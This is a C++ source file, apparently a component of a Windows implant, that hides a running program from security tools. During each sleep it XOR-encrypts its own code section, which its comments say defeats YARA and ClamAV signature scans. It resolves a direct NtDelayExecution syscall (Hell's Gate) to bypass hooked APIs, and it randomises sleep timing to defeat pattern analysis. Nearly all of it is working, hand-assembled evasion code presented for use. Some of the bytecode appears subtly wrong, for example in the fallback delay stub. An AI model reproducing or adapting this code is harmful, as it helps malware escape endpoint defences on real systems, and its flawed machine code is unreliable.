// ============================================================================
// sleep_obfuscation.cpp — Enhanced Sleep Obfuscation Implementation
// ============================================================================
// Multi-layer memory obfuscation during sleep periods.
//
// ARCHITECTURE (v2 — Unified Trampoline):
//   The sleep trampoline lives entirely in VirtualAlloc'd RX memory (outside
//   .text). It performs the FULL cycle: VirtualProtect(RW) → XOR encrypt .text
//   → NtDelayExecution (Hell's Gate or fallback) → XOR decrypt .text →
//   VirtualProtect(RX).  Since ALL executable code during this cycle runs
//   outside .text, there is zero self-corruption risk.
//
//   Previous architecture (v1) had encryptTextSection() encrypt .text then
//   return to obfuscatedSleep() which was itself in (now encrypted) .text →
//   0xc0000005 ACCESS_VIOLATION.  This is permanently fixed by keeping the
//   trampoline self-contained.
//
// Techniques:
//   - .text XOR encryption → defeats YARA/ClamAV signature scanning
//   - NtDelayExecution via Hell's Gate → bypasses hooked Sleep API
//   - ±30% timing jitter → defeats pattern analysis
//   - VirtualProtect handled inside trampoline → no DEP violation
// ============================================================================

#include "sleep_obfuscation.h"
#include "obfuscation.h"
#include "api_table.h"

#ifdef _WIN32

#include <algorithm>
#include <cstring>
#include <random>

// ============================================================================
// STATIC MEMBER DEFINITIONS
// ============================================================================
bool SleepObfuscation::s_initialized    = false;
bool SleepObfuscation::s_textEncrypted  = false;
uint8_t* SleepObfuscation::s_textBase   = nullptr;
uint32_t SleepObfuscation::s_textSize   = 0;
uint8_t  SleepObfuscation::s_textBackupKey[32] = {0};

// Hell's Gate NtDelayExecution stub (VirtualAlloc'd)
NtDelayExecutionFunc g_NtDelayExecution = nullptr;

// Fallback delay stub: wraps kernel32!Sleep (VirtualAlloc'd)
// Used when Hell's Gate is disabled or buildDelayStub fails.
static NtDelayExecutionFunc g_fallbackDelayStub = nullptr;

// Unified sleep trampoline (VirtualAlloc'd)
// Signature: void(uint8_t* data, uint32_t size, const uint8_t* key,
//                 int64_t delay100ns, NtDelayExecutionFunc ntDelay,
//                 BOOL(WINAPI* vp)(LPVOID,SIZE_T,DWORD,PDWORD))
typedef void (*SleepTrampolineFunc)(
    uint8_t* data, uint32_t size, const uint8_t* key,
    int64_t delay100ns, NtDelayExecutionFunc ntDelay,
    BOOL (WINAPI *vp)(LPVOID, SIZE_T, DWORD, PDWORD));
static SleepTrampolineFunc g_sleepTrampoline = nullptr;

// ============================================================================
// BUILD FALLBACK DELAY STUB — Wraps kernel32!Sleep for NtDelayExecution sig
// ============================================================================
// Converts 100ns units (negative = relative) to milliseconds and calls
// g_api.Sleep.  Lives in VirtualAlloc'd RX memory.  Safe fallback when
// Hell's Gate is disabled or syscall resolution fails.
//
// Bytecode (x64):
//   sub rsp, 0x28           ; shadow space
//   mov rax, [rdx]          ; DelayInterval->QuadPart (negative 100ns)
//   neg rax                 ; make positive
//   mov ecx, 10000          ; divisor
//   xor edx, edx
//   div ecx                 ; eax = ms
//   mov ecx, eax            ; Sleep(ms)
//   lea rax, [rip+sleepPtr] ; load g_api.Sleep address from data slot
//   call rax
//   xor eax, eax            ; STATUS_SUCCESS
//   add rsp, 0x28
//   ret
//
// Layout: [code (44 bytes)] [padding (4 bytes)] [8-byte Sleep ptr]
// ============================================================================
static bool buildFallbackDelayStub(NtDelayExecutionFunc* outFunc) {
    // Allocate: 64 bytes code + data slot
    BYTE* mem = (BYTE*)VirtualAlloc(NULL, 64,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return false;

    int off = 0;
    // sub rsp, 0x28
    mem[off++] = 0x48; mem[off++] = 0x83; mem[off++] = 0xEC; mem[off++] = 0x28;
    // mov rax, [rdx]
    mem[off++] = 0x48; mem[off++] = 0x8B; mem[off++] = 0x02;
    // neg rax
    mem[off++] = 0x48; mem[off++] = 0xF7; mem[off++] = 0xD8;
    // mov ecx, 10000 (0x2710)
    mem[off++] = 0xB9; mem[off++] = 0x10; mem[off++] = 0x27; mem[off++] = 0x00; mem[off++] = 0x00;
    // xor edx, edx
    mem[off++] = 0x33; mem[off++] = 0xD2;
    // div ecx
    mem[off++] = 0xF7; mem[off++] = 0xF1;
    // mov ecx, eax
    mem[off++] = 0x89; mem[off++] = 0xC1;
    // lea rax, [rip + dataSlot] — dataSlot is at offset 44 (after code + pad)
    // lea uses RIP-relative: offset = 44 - (off + 7) where 7 = instruction len
    int dataSlot = 44;  // aligned to 8 after 44-byte code
    int ripRel = dataSlot - (off + 7);
    mem[off++] = 0x48; mem[off++] = 0x8D; mem[off++] = 0x05;
    memcpy(&mem[off], &ripRel, 4); off += 4;
    // call rax
    mem[off++] = 0xFF; mem[off++] = 0xD0;
    // xor eax, eax
    mem[off++] = 0x33; mem[off++] = 0xC0;
    // add rsp, 0x28
    mem[off++] = 0x48; mem[off++] = 0x83; mem[off++] = 0xC4; mem[off++] = 0x28;
    // ret
    mem[off++] = 0xC3;
    // off should be 44

    // Write Sleep function pointer at aligned offset
    // Store Sleep address for the stub's `call rax` to use.
    // g_api.Sleep is always resolved before init() runs, so the
    // ternary is purely defensive.
    *(void**)(mem + dataSlot) = g_api.Sleep ?
        (void*)g_api.Sleep : (void*)Sleep;

    DWORD oldProt;
    VirtualProtect(mem, 64, PAGE_EXECUTE_READ, &oldProt);

    *outFunc = (NtDelayExecutionFunc)(void*)mem;
    return true;
}

// ============================================================================
// BUILD SLEEP TRAMPOLINE — Full encrypt→sleep→decrypt outside .text
// ============================================================================
// This is the core fix for Bug 1 (0xc0000005 crash).
//
// The trampoline does the COMPLETE lifecycle from VirtualAlloc'd RX memory:
//   1. VirtualProtect(.text, PAGE_READWRITE)   — safe, we're outside .text
//   2. XOR encrypt entire .text section
//   3. NtDelayExecution (Hell's Gate or fallback) — sleep with encrypted .text
//   4. XOR decrypt entire .text section
//   5. VirtualProtect(.text, PAGE_EXECUTE_READ) — restore, we can safely return
//
// Signature: void(data, size, key, delay100ns, pNtDelayExec, pVirtualProtect)
//   rcx=uint8_t* data
//   rdx=uint32_t size
//   r8=const uint8_t* key
//   r9=int64_t delay100ns
//   [rsp+0x28]=NtDelayExecutionFunc pNtDelayExec
//   [rsp+0x30]=BOOL(WINAPI*)(LPVOID,SIZE_T,DWORD,PDWORD) pVirtualProtect
//
// Total bytecode: 0xB8 (184 bytes).  Allocated in 256-byte RX page.
// ============================================================================

// Bytecode template as static array — offsets used for jump patching
// Computed and verified: all RIP-relative displacements are correct.
static const BYTE kTrampolineTemplate[] = {
    // --- PROLOGUE: save non-volatile registers (x64 ABI) ---
    // offset 0x00 (10 bytes)
    0x53,                               // push rbx
    0x56,                               // push rsi
    0x57,                               // push rdi
    0x41, 0x54,                         // push r12
    0x41, 0x55,                         // push r13
    0x41, 0x56,                         // push r14
    0x41, 0x57,                         // push r15
    // rsp -= 0x38, original rsp at rsp+0x38

    // --- LOAD PARAMS into non-volatile registers ---
    // offset 0x0B (9 bytes)
    0x4C, 0x8B, 0xE1,                   // mov r12, rcx          (data)
    0x44, 0x8B, 0xEA,                   // mov r13d, edx         (size)
    0x4C, 0x8B, 0xF0,                   // mov r14, r8           (key)

    // --- LOAD STACK PARAMS (before sub rsp, simple offsets) ---
    // offset 0x14 (5 bytes): 5th param at orig_rsp+0x28 = current_rsp+0x60
    0x48, 0x8B, 0x5C, 0x24, 0x60,       // mov rbx, [rsp+0x60]  (pNtDelayExec)
    // offset 0x19 (5 bytes): 6th param at orig_rsp+0x30 = current_rsp+0x68
    0x48, 0x8B, 0x74, 0x24, 0x68,       // mov rsi, [rsp+0x68]  (pVirtualProtect)

    // --- ALLOCATE LOCALS ---
    // offset 0x1E (4 bytes)
    0x48, 0x83, 0xEC, 0x30,             // sub rsp, 0x30  (0x20 shadow + 0x08 oldProt + 0x08 pad)
    // total rsp -= 0x68 from function entry

    // --- SAVE delay in shadow space ---
    // offset 0x22 (5 bytes)
    0x4C, 0x89, 0x4C, 0x24, 0x28,       // mov [rsp+0x28], r9   (save delay100ns)

    // === PHASE 1: VirtualProtect(.text, PAGE_READWRITE) ===
    // offset 0x27 (3 bytes)
    0x4C, 0x89, 0xE1,                   // mov rcx, r12          (lpAddress = data)
    // offset 0x2A (3 bytes)
    0x4C, 0x89, 0xEA,                   // mov rdx, r13          (dwSize = size)
    // offset 0x2D (6 bytes)
    0x41, 0xB8, 0x04, 0x00, 0x00, 0x00, // mov r8d, 0x04         (PAGE_READWRITE)
    // offset 0x33 (5 bytes)
    0x4C, 0x8D, 0x4C, 0x24, 0x20,       // lea r9, [rsp+0x20]   (&oldProt)
    // offset 0x38 (2 bytes)
    0xFF, 0xD6,                         // call rsi              (VirtualProtect)
    // offset 0x3A (2 bytes)
    0x85, 0xC0,                         // test eax, eax
    // offset 0x3C (6 bytes): jz vp_fail → offset 0xA8. disp = 0xA8 - 0x42 = 0x66
    0x0F, 0x84, 0x66, 0x00, 0x00, 0x00, // jz near 0xA8 (vp_fail/skip)

    // === PHASE 2: XOR ENCRYPT .text ===
    // offset 0x42 (2 bytes): i = 0
    0x33, 0xC9,                         // xor ecx, ecx
    // ENC_LOOP at offset 0x44
    // offset 0x44 (3 bytes)
    0x44, 0x39, 0xE9,                   // cmp ecx, r13d         (i < size?)
    // offset 0x47 (6 bytes): jge enc_done → offset 0x62. disp = 0x62 - 0x4D = 0x15
    0x0F, 0x8D, 0x15, 0x00, 0x00, 0x00, // jge near 0x62 (enc_done)
    // offset 0x4D (2 bytes)
    0x8B, 0xC1,                         // mov eax, ecx
    // offset 0x4F (3 bytes)
    0x83, 0xE0, 0x1F,                   // and eax, 0x1F          (i % 32)
    // offset 0x52 (4 bytes)
    0x42, 0x8A, 0x04, 0x30,             // mov al, [r14+rax]      (key[i%32])
    // offset 0x56 (4 bytes)
    0x42, 0x30, 0x04, 0x0C,             // xor [r12+rcx], al      (data[i] ^= key)
    // offset 0x5A (3 bytes)
    0x48, 0xFF, 0xC1,                   // inc rcx
    // offset 0x5D (5 bytes): jmp enc_loop → offset 0x44. disp = 0x44 - 0x62 = -0x1E
    0xE9, 0xE2, 0xFF, 0xFF, 0xFF,       // jmp near 0x44 (enc_loop)
    // enc_done at offset 0x62

    // === PHASE 3: NtDelayExecution (sleep) ===
    // offset 0x62 (5 bytes)
    0x48, 0x8B, 0x44, 0x24, 0x28,       // mov rax, [rsp+0x28]   (delay100ns)
    // offset 0x67 (5 bytes)
    0x48, 0x89, 0x44, 0x24, 0x20,       // mov [rsp+0x20], rax   (LARGE_INTEGER on stack)
    // offset 0x6C (5 bytes)
    0x48, 0x8D, 0x54, 0x24, 0x20,       // lea rdx, [rsp+0x20]   (&DelayInterval)
    // offset 0x71 (2 bytes)
    0x33, 0xC9,                         // xor ecx, ecx          (Alertable = FALSE)
    // offset 0x73 (2 bytes)
    0xFF, 0xD3,                         // call rbx              (NtDelayExecution)

    // === PHASE 4: XOR DECRYPT .text (same operation — XOR is symmetric) ===
    // offset 0x75 (2 bytes): i = 0
    0x33, 0xC9,                         // xor ecx, ecx
    // DEC_LOOP at offset 0x77
    // offset 0x77 (3 bytes)
    0x44, 0x39, 0xE9,                   // cmp ecx, r13d
    // offset 0x7A (6 bytes): jge dec_done → offset 0x95. disp = 0x95 - 0x80 = 0x15
    0x0F, 0x8D, 0x15, 0x00, 0x00, 0x00, // jge near 0x95 (dec_done)
    // offset 0x80 (2 bytes)
    0x8B, 0xC1,                         // mov eax, ecx
    // offset 0x82 (3 bytes)
    0x83, 0xE0, 0x1F,                   // and eax, 0x1F
    // offset 0x85 (4 bytes)
    0x42, 0x8A, 0x04, 0x30,             // mov al, [r14+rax]
    // offset 0x89 (4 bytes)
    0x42, 0x30, 0x04, 0x0C,             // xor [r12+rcx], al
    // offset 0x8D (3 bytes)
    0x48, 0xFF, 0xC1,                   // inc rcx
    // offset 0x90 (5 bytes): jmp dec_loop → offset 0x77. disp = 0x77 - 0x95 = -0x1E
    0xE9, 0xE2, 0xFF, 0xFF, 0xFF,       // jmp near 0x77 (dec_loop)
    // dec_done at offset 0x95

    // === PHASE 5: VirtualProtect(.text, PAGE_EXECUTE_READ) — restore ===
    // offset 0x95 (3 bytes)
    0x4C, 0x89, 0xE1,                   // mov rcx, r12          (lpAddress)
    // offset 0x98 (3 bytes)
    0x4C, 0x89, 0xEA,                   // mov rdx, r13          (dwSize)
    // offset 0x9B (6 bytes)
    0x41, 0xB8, 0x20, 0x00, 0x00, 0x00, // mov r8d, 0x20         (PAGE_EXECUTE_READ)
    // offset 0xA1 (5 bytes)
    0x4C, 0x8D, 0x4C, 0x24, 0x20,       // lea r9, [rsp+0x20]   (&dummy oldProt)
    // offset 0xA6 (2 bytes)
    0xFF, 0xD6,                         // call rsi              (VirtualProtect)

    // === VP_FAIL / EPILOGUE ===
    // offset 0xA8 (4 bytes)
    0x48, 0x83, 0xC4, 0x30,             // add rsp, 0x30
    // offset 0xAC (10 bytes)
    0x41, 0x5F,                         // pop r15
    0x41, 0x5E,                         // pop r14
    0x41, 0x5D,                         // pop r13
    0x41, 0x5C,                         // pop r12
    0x5F,                               // pop rdi
    0x5E,                               // pop rsi
    0x5B,                               // pop rbx
    0xC3,                               // ret
};
// Total: 0xB8 bytes

static bool buildSleepTrampoline(SleepTrampolineFunc* outFunc) {
    // Allocate executable memory for the trampoline
    BYTE* mem = (BYTE*)VirtualAlloc(NULL, 256,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return false;

    // Copy the verified bytecode template
    memcpy(mem, kTrampolineTemplate, sizeof(kTrampolineTemplate));

    // Make RX for stealth
    DWORD oldProt;
    VirtualProtect(mem, 256, PAGE_EXECUTE_READ, &oldProt);

    *outFunc = (SleepTrampolineFunc)(void*)mem;
    return true;
}

// ============================================================================
// BUILD NTDELAYEXECUTION VIA HELL'S GATE (fixed RVA→file offset)
// ============================================================================
// Reads NtDelayExecution's syscall number from on-disk ntdll, builds a
// direct syscall stub. Bypasses userland hooks on kernel32!Sleep and
// ntdll!NtDelayExecution.
//
// BUG FIX (Bug 2): All RVAs from the disk-mapped PE are now properly
// converted to file offsets using section headers:
//   file_offset = rva - section.VirtualAddress + section.PointerToRawData
//
// Previously the code treated RVAs as direct file offsets, causing garbage
// reads and a strcmp crash through ucrtbase.
// ============================================================================
static bool buildDelayStub() {
    HANDLE hFile = g_api.CreateFileA(
        OBF("C:\\Windows\\System32\\ntdll.dll"),
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    HANDLE hMapping = g_api.CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) { g_api.CloseHandle(hFile); return false; }

    LPVOID disk_map = g_api.MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!disk_map) { g_api.CloseHandle(hMapping); g_api.CloseHandle(hFile); return false; }

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)disk_map;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        g_api.UnmapViewOfFile(disk_map); g_api.CloseHandle(hMapping); g_api.CloseHandle(hFile);
        return false;
    }

    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)disk_map + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        g_api.UnmapViewOfFile(disk_map); g_api.CloseHandle(hMapping); g_api.CloseHandle(hFile);
        return false;
    }

    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
    DWORD sectionCount = nt->FileHeader.NumberOfSections;
    if (sectionCount == 0) {
        g_api.UnmapViewOfFile(disk_map); g_api.CloseHandle(hMapping); g_api.CloseHandle(hFile);
        return false;
    }

    // ── RVA → file offset helper for disk-mapped PE ──
    // Since CreateFileMappingA was called WITHOUT SEC_IMAGE, the mapping
    // reflects the raw on-disk layout.  All RVAs must be converted.
    auto rvaToFileOffset = [&](DWORD rva) -> DWORD {
        // RVAs below the first section's VirtualAddress live in PE headers
        if (rva < sections[0].VirtualAddress && rva < sections[0].PointerToRawData)
            return rva;

        for (DWORD i = 0; i < sectionCount; i++) {
            DWORD secVA  = sections[i].VirtualAddress;
            DWORD secEnd = secVA + std::max(sections[i].SizeOfRawData,
                                            sections[i].Misc.VirtualSize);
            if (rva >= secVA && rva < secEnd) {
                return rva - secVA + sections[i].PointerToRawData;
            }
        }
        return 0; // RVA not found in any section
    };

    // ── Locate export directory ──
    DWORD exportRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exportSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (exportRVA == 0 || exportSize == 0) {
        g_api.UnmapViewOfFile(disk_map); g_api.CloseHandle(hMapping); g_api.CloseHandle(hFile);
        return false;
    }

    DWORD exportOff = rvaToFileOffset(exportRVA);
    if (exportOff == 0) {
        g_api.UnmapViewOfFile(disk_map); g_api.CloseHandle(hMapping); g_api.CloseHandle(hFile);
        return false;
    }

    IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)disk_map + exportOff);

    // ── Convert export table array RVAs ──
    DWORD namesOff    = rvaToFileOffset(exports->AddressOfNames);
    DWORD ordsOff     = rvaToFileOffset(exports->AddressOfNameOrdinals);
    DWORD funcsOff    = rvaToFileOffset(exports->AddressOfFunctions);
    if (!namesOff || !ordsOff || !funcsOff) {
        g_api.UnmapViewOfFile(disk_map); g_api.CloseHandle(hMapping); g_api.CloseHandle(hFile);
        return false;
    }

    DWORD* names     = (DWORD*)((BYTE*)disk_map + namesOff);
    WORD*  ordinals  = (WORD*)((BYTE*)disk_map + ordsOff);
    DWORD* functions = (DWORD*)((BYTE*)disk_map + funcsOff);

    DWORD syscall_num = 0;
    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        if (names[i] == 0) continue;

        DWORD nameOff = rvaToFileOffset(names[i]);
        if (nameOff == 0) continue;

        char* name = (char*)((BYTE*)disk_map + nameOff);

        // Boundary check: ensure we don't read past the mapping
        // (simple heuristic: first byte must be printable ASCII or null)
        if ((unsigned char)name[0] != 'N' && (unsigned char)name[0] != 'Z') continue;

        if (strcmp(name, "NtDelayExecution") == 0) {
            DWORD ordinal = ordinals[i];
            if (ordinal >= exports->NumberOfFunctions) break;

            DWORD funcRVA  = functions[ordinal];
            DWORD funcOff  = rvaToFileOffset(funcRVA);
            if (funcOff == 0) break;

            // Forwarded export check: if funcRVA falls inside the export
            // directory's RVA range, it's a string (forwarder), not code.
            if (funcRVA >= exportRVA &&
                funcRVA < exportRVA + exportSize) break;

            BYTE* func_ptr = (BYTE*)disk_map + funcOff;

            // Hell's Gate pattern: 4C 8B D1 B8 <SSN> 00 00 00
            //   4C 8B D1 = mov r10, rcx
            //   B8 XX XX XX XX = mov eax, <SSN>
            if (func_ptr[0] == 0x4C && func_ptr[1] == 0x8B &&
                func_ptr[2] == 0xD1 && func_ptr[3] == 0xB8) {
                syscall_num = *(DWORD*)(func_ptr + 4);
            }
            break;
        }
    }

    g_api.UnmapViewOfFile(disk_map);
    g_api.CloseHandle(hMapping);
    g_api.CloseHandle(hFile);

    if (syscall_num == 0) return false;

    // ── Find syscall;ret gadget (0F 05 C3) in in-memory ntdll .text ──
    HMODULE hNtdll = g_api.LoadLibraryA(OBF("ntdll.dll"));
    if (!hNtdll) return false;

    IMAGE_DOS_HEADER* dos2 = (IMAGE_DOS_HEADER*)hNtdll;
    IMAGE_NT_HEADERS* nt2  = (IMAGE_NT_HEADERS*)((BYTE*)hNtdll + dos2->e_lfanew);
    IMAGE_SECTION_HEADER* sec2 = IMAGE_FIRST_SECTION(nt2);
    void* syscall_ret = nullptr;

    for (WORD i = 0; i < nt2->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec2[i].Name, ".text", 5) == 0) {
            BYTE* text = (BYTE*)hNtdll + sec2[i].VirtualAddress;
            DWORD sz   = sec2[i].Misc.VirtualSize;
            // Scan backwards for speed; syscall;ret is near the end of
            // ntdll's .text
            for (DWORD j = sz - 3; j > 0x200; j--) {
                if (text[j] == 0x0F && text[j+1] == 0x05 && text[j+2] == 0xC3) {
                    syscall_ret = (void*)(text + j);
                    break;
                }
            }
            break;
        }
    }

    if (!syscall_ret) return false;

    // ── Build Hell's Gate syscall stub ──
    // mov r10, rcx; mov eax,<SSN>; mov r11,<syscall;ret>; jmp r11
    BYTE* stub = (BYTE*)VirtualAlloc(NULL, 64,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!stub) return false;

    int off = 0;
    stub[off++] = 0x4C; stub[off++] = 0x8B; stub[off++] = 0xD1;  // mov r10, rcx
    stub[off++] = 0xB8;                                             // mov eax, <SSN>
    stub[off++] = (syscall_num)       & 0xFF;
    stub[off++] = (syscall_num >> 8)  & 0xFF;
    stub[off++] = (syscall_num >> 16) & 0xFF;
    stub[off++] = (syscall_num >> 24) & 0xFF;

    uint64_t addr = (uint64_t)syscall_ret;
    stub[off++] = 0x49; stub[off++] = 0xBB;                       // mov r11, <addr>
    memcpy(&stub[off], &addr, 8); off += 8;
    stub[off++] = 0x41; stub[off++] = 0xFF; stub[off++] = 0xE3;  // jmp r11

    DWORD oldProt;
    VirtualProtect(stub, 64, PAGE_EXECUTE_READ, &oldProt);

    g_NtDelayExecution = (NtDelayExecutionFunc)stub;
    return true;
}

// ============================================================================
// INITIALIZATION
// ============================================================================
bool SleepObfuscation::init() {
    if (s_initialized) return true;

    // Find .text section of current process (MinGW-compatible)
    HMODULE hSelf = GetModuleHandle(NULL);
    if (!hSelf) return false;

    BYTE* base = (BYTE*)hSelf;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;

    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            s_textBase = base + sections[i].VirtualAddress;
            s_textSize = sections[i].Misc.VirtualSize;
            if (s_textSize == 0) s_textSize = sections[i].SizeOfRawData;
            break;
        }
    }

    if (!s_textBase || s_textSize == 0) return false;

    // Generate random XOR key (unique per process start)
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    for (int k = 0; k < 32; k++) s_textBackupKey[k] = (uint8_t)dis(gen);

    // ── Build fallback delay stub (always, for safety) ──
    if (!buildFallbackDelayStub(&g_fallbackDelayStub)) return false;

    // ── Build unified sleep trampoline ──
    if (!buildSleepTrampoline(&g_sleepTrampoline)) return false;

    // ── Build Hell's Gate NtDelayExecution stub ──
    // Direct syscall bypasses userland hooks on kernel32!Sleep and
    // ntdll!NtDelayExecution.  Failure is non-fatal: g_fallbackDelayStub
    // (kernel32!Sleep wrapper) is used as transparent fallback.
    buildDelayStub();

    s_initialized = true;
    return true;
}

// ============================================================================
// .TEXT SECTION ENCRYPTION — Standalone (for external callers)
// ============================================================================
// NOTE: These functions are NOT used by obfuscatedSleep() in the v2
// architecture.  They remain for backward compatibility with any external
// callers.  WARNING: do not call encryptTextSection() and then return to
// .text code — use the trampoline (obfuscatedSleep) instead.
// ============================================================================
bool SleepObfuscation::encryptTextSection() {
    // WARNING: This function runs from .text and encrypts .text inline.
    // It is UNSAFE to call from within .text code (the function encrypts
    // its own instructions mid-execution).  Use obfuscatedSleep() instead
    // for safe .text encryption via the VirtualAlloc'd trampoline.
    // Kept only for backward compatibility with external callers that
    // guarantee they will NOT return to .text after calling this.
    if (!s_textBase || s_textSize == 0 || s_textEncrypted) return false;

    DWORD oldProt;
    if (!g_api.VirtualProtect(s_textBase, s_textSize, PAGE_READWRITE, &oldProt))
        return false;

    // XOR encrypt inline — ONLY safe if caller ensured no .text return
    const uint8_t* key = s_textBackupKey;
    for (uint32_t i = 0; i < s_textSize; i++)
        s_textBase[i] ^= key[i % 32];

    g_api.VirtualProtect(s_textBase, s_textSize, oldProt, &oldProt);
    s_textEncrypted = true;
    return true;
}

bool SleepObfuscation::decryptTextSection() {
    // WARNING: Same self-corruption risk as encryptTextSection().
    // Use obfuscatedSleep() for safe decrypt via trampoline.
    if (!s_textBase || s_textSize == 0 || !s_textEncrypted) return false;

    DWORD oldProt;
    if (!g_api.VirtualProtect(s_textBase, s_textSize, PAGE_READWRITE, &oldProt))
        return false;

    const uint8_t* key = s_textBackupKey;
    for (uint32_t i = 0; i < s_textSize; i++)
        s_textBase[i] ^= key[i % 32];

    g_api.VirtualProtect(s_textBase, s_textSize, PAGE_EXECUTE_READ, &oldProt);
    s_textEncrypted = false;
    return true;
}

// ============================================================================
// NTDELAYEXECUTION WRAPPER
// ============================================================================
bool SleepObfuscation::ntDelayExecution(int64_t delay100ns) {
    // Use the fallback delay stub (Sleep wrapper) — guaranteed available
    // after init().  Hell's Gate stub takes priority if available.
    NtDelayExecutionFunc stub = g_NtDelayExecution ?
        g_NtDelayExecution : g_fallbackDelayStub;
    if (!stub) return false;

    LARGE_INTEGER delay;
    delay.QuadPart = delay100ns;
    return stub(FALSE, &delay) >= 0;
}

// ============================================================================
// OBFUSCATED SLEEP — Main entry point (v2 trampoline architecture)
// ============================================================================
// All sensitive work (VirtualProtect, encrypt, sleep, decrypt, VirtualProtect)
// happens inside the VirtualAlloc'd trampoline — zero .text execution while
// .text is encrypted.
// ============================================================================
void SleepObfuscation::obfuscatedSleep(int seconds) {
    if (!s_initialized) init();
    if (!g_sleepTrampoline) {
        // Trampoline unavailable — fall back to plain Sleep
        g_api.Sleep(seconds * 1000);
        return;
    }

    // Calculate jitter BEFORE entering the trampoline.
    // The jitter computation uses std::mt19937 which lives in .text — safe
    // because .text is not yet encrypted at this point.
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> jitter_pct(-30, 30);
    int jittered = seconds + (seconds * jitter_pct(gen) / 100);
    if (jittered < 1) jittered = 1;
    int64_t delay100ns = -(int64_t)jittered * 10000000LL;

    // Select the best available NtDelayExecution stub
    NtDelayExecutionFunc ntStub = g_NtDelayExecution ?
        g_NtDelayExecution : g_fallbackDelayStub;

    // Call unified trampoline: handles encrypt → sleep → decrypt entirely
    // from VirtualAlloc'd RX memory, including VirtualProtect transitions.
    g_sleepTrampoline(s_textBase, s_textSize, s_textBackupKey,
                      delay100ns, ntStub, g_api.VirtualProtect);
}

void SleepObfuscation::obfuscatedSleepMs(int milliseconds) {
    if (!s_initialized) init();

    // Short sleeps: don't bother with encryption overhead
    if (milliseconds < 50) {
        g_api.Sleep(milliseconds);
        return;
    }

    if (!g_sleepTrampoline) {
        g_api.Sleep(milliseconds);
        return;
    }

    // Jitter before trampoline
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> jitter_pct(-20, 20);
    int jittered = milliseconds + (milliseconds * jitter_pct(gen) / 100);
    if (jittered < 10) jittered = 10;

    int64_t delay100ns = -(int64_t)jittered * 10000LL;

    NtDelayExecutionFunc ntStub = g_NtDelayExecution ?
        g_NtDelayExecution : g_fallbackDelayStub;

    g_sleepTrampoline(s_textBase, s_textSize, s_textBackupKey,
                      delay100ns, ntStub, g_api.VirtualProtect);
}

bool SleepObfuscation::isInitialized() { return s_initialized; }

#endif // _WIN32
